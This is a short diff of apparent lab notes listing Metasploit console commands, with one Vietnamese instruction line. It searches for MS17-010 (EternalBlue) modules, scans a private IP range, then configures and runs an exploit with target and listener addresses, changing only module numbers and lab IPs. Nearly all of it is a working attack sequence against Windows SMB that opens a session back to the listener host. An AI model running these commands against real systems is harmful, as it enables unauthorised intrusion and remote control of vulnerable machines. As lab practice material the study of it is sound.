@@ -1,16 +1,16 @@
 msfconsole
 snap install metasploit-framework
 search ms17-010
-use 1
+use 24
 show options
-set RHOSTS 192.168.57.0-255
+set RHOSTS 10.0.2.1-20
 set THREADS 10
 run
  Khởi động Metasploit Framework và chạy câu lệnh “search ms17-010” 
 use 2
 show options
-set RHOSTS 192.168.57.133
-set LHOSTS 192.168.57.132
+set RHOSTS 10.0.2.17
+set LHOSTS 10.0.2.15
 run
 help
 
